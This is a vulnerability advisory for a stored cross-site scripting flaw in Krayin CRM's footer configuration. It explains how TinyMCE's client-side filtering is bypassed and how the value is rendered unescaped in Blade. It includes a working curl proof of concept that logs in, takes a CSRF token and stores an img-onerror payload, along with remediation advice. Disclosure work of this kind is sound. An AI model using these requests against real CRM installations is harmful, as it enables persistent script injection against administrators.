# Presentation

**Security Vulnerability:** Stored Cross-Site Scripting (Stored XSS) via Footer Configuration (TinyMCE Sanitization Bypass)

| Field                  | Value                                                                 |
| ---------------------- | --------------------------------------------------------------------- |
| **Vulnerability Type** | Cross-Site Scripting (Stored XSS)                                     |
| **CWE**                | CWE-79 (Primary), CWE-602 (Root Cause), CWE-116 (Contributing)        |
| **CVE**                | Pending                                                               |
| **Affected Component** | Configuration Management (ConfigurationController / General Settings) |
| **Affected Parameter** | `general.settings.footer.label`                                       |
| **Software**           | Krayin CRM                                                            |
| **Affected Versions**  | ≤ 2.2.5                                                               |
| **Business Area**      | Customer Relationship Management (CRM)                                |
| **Submitter**          | bl4dsc4n                                                              |

---

# Executive Summary

A **Stored Cross-Site Scripting (Stored XSS)** vulnerability exists in **Krayin CRM ≤ 2.2.5** within the global footer configuration feature.

The application allows authenticated users with permission to modify system configuration to store arbitrary HTML content inside the configuration parameter:

```
general.settings.footer.label
```

Although the web interface attempts to sanitize HTML using TinyMCE's client-side filtering, this protection is performed exclusively in the browser and can be completely bypassed by sending a direct HTTP request to the backend.

The stored content is later rendered using Laravel Blade's unescaped output (`{!! !!}`), resulting in persistent JavaScript execution whenever an administrator or another authenticated user loads any administrative page displaying the global footer.

---

# Vulnerability Details

## Vulnerability Type

Stored Cross-Site Scripting (Stored XSS)

## Affected Endpoint

```
POST /admin/configuration/general/settings
```

## Affected Parameter

```
general[settings][footer][label]
```

---

# Impact

An authenticated attacker with permission to modify system configuration can permanently inject malicious JavaScript into the global footer.

Because the footer is rendered across the administration interface, the payload executes automatically whenever another authenticated administrator or privileged user visits any affected page.

Successful exploitation may allow an attacker to:

* Execute arbitrary JavaScript in another administrator's browser.
* Steal session cookies (when not protected by HttpOnly).
* Capture CSRF tokens.
* Perform authenticated actions on behalf of the victim.
* Modify application configuration.
* Create or modify privileged accounts.
* Facilitate privilege escalation in environments with multiple administrators.

---

# Root Cause Analysis

The vulnerability is caused by a combination of insecure design decisions:

1. The backend performs **no server-side HTML sanitization** before storing the configuration value.

2. The stored value is rendered using Laravel Blade's unescaped rendering syntax:

```blade
{!! core()->getConfigData('general.settings.footer.label') !!}
```

3. The application relies exclusively on TinyMCE client-side filtering.

Client-side validation is not a security boundary because attackers can communicate directly with the HTTP endpoint and completely bypass browser-side restrictions.

---

# Attack Scenario

An authenticated administrator submits a direct HTTP POST request to the configuration endpoint containing malicious HTML instead of using the TinyMCE editor.

The payload is stored without sanitization.

Every administrator subsequently viewing the administration panel automatically executes the injected JavaScript in their browser.

---

# Proof of Concept

## Malicious Payload

```html
<img src=x onerror=alert(document.domain)>
```

## Authentication

```bash
BASE="http://172.25.44.135:8084"
JAR="$(mktemp)"

tok(){
    grep -oP 'name="_token"\s+value="\K[^"]+' <<<"$1" | head -1
}

T1=$(tok "$(curl -s -c "$JAR" "$BASE/admin/login")")

curl -s \
    -b "$JAR" \
    -c "$JAR" \
    -L \
    --data-urlencode "email=admin@example.com" \
    --data-urlencode "password=admin123" \
    --data-urlencode "_token=$T1" \
    "$BASE/admin/login"
```

## Stored XSS Injection

```bash
T2=$(tok "$(curl -s -b "$JAR" -c "$JAR" \
"$BASE/admin/configuration/general/settings")")

curl -s \
    -b "$JAR" \
    -c "$JAR" \
    -L \
    --data-urlencode "_token=$T2" \
    --data-urlencode 'general[settings][footer][label]=<img src=x onerror=alert(document.domain)>' \
    "$BASE/admin/configuration/general/settings"
```

---

# Reproduction Steps

1. Authenticate as an administrator.
2. Obtain a valid CSRF token.
3. Send a direct POST request to:

```
POST /admin/configuration/general/settings
```

4. Set the parameter:

```
general[settings][footer][label]
```

to:

```html
<img src=x onerror=alert(document.domain)>
```

5. Save the configuration.
6. Browse to any administration page.
7. The JavaScript payload executes automatically from the persistent footer.

---

# Security Impact

**Confidentiality**

* Theft of administrator session information.
* Disclosure of sensitive application data.

**Integrity**

* Execution of arbitrary actions as another administrator.
* Unauthorized modification of application settings.

**Availability**

* Limited impact.
* JavaScript payloads may interfere with normal administration workflows.

---

# Root Cause

* Missing server-side sanitization.
* Reliance on client-side TinyMCE filtering.
* Unsafe rendering using unescaped Blade directives (`{!! !!}`).

---

# Suggested Remediation

* Perform HTML sanitization on the server before storing rich-text configuration fields.
* Replace unescaped Blade rendering with escaped output whenever HTML rendering is unnecessary.
* If HTML support is required, implement an allowlist-based HTML sanitizer such as HTMLPurifier.
* Validate all configurable rich-text fields on the backend regardless of client-side controls.
* Consider deploying a strict Content Security Policy (CSP) as an additional defense-in-depth measure.

---

# Suggested CVSS v3.1

**Vector**

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:L
```

**Base Score**

**6.8 (Medium)**

---

# CWE Mapping

* **CWE-79** — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
* **CWE-602** — Client-Side Enforcement of Server-Side Security
* **CWE-116** — Improper Encoding or Escaping of Output

---

# Vendor Response

Pending.

---

# Timeline

| Date       | Event                    |
| ---------- | ------------------------ |
| YYYY-MM-DD | Vulnerability discovered |
| YYYY-MM-DD | Vendor notified          |
| YYYY-MM-DD | Vendor acknowledged      |
| YYYY-MM-DD | Patch released           |
| YYYY-MM-DD | Public disclosure        |
| YYYY-MM-DD | CVE assigned             |

---

# References

* OWASP Cross-Site Scripting Prevention Cheat Sheet
* CWE-79
* CWE-602
* CWE-116
* Laravel Blade Documentation



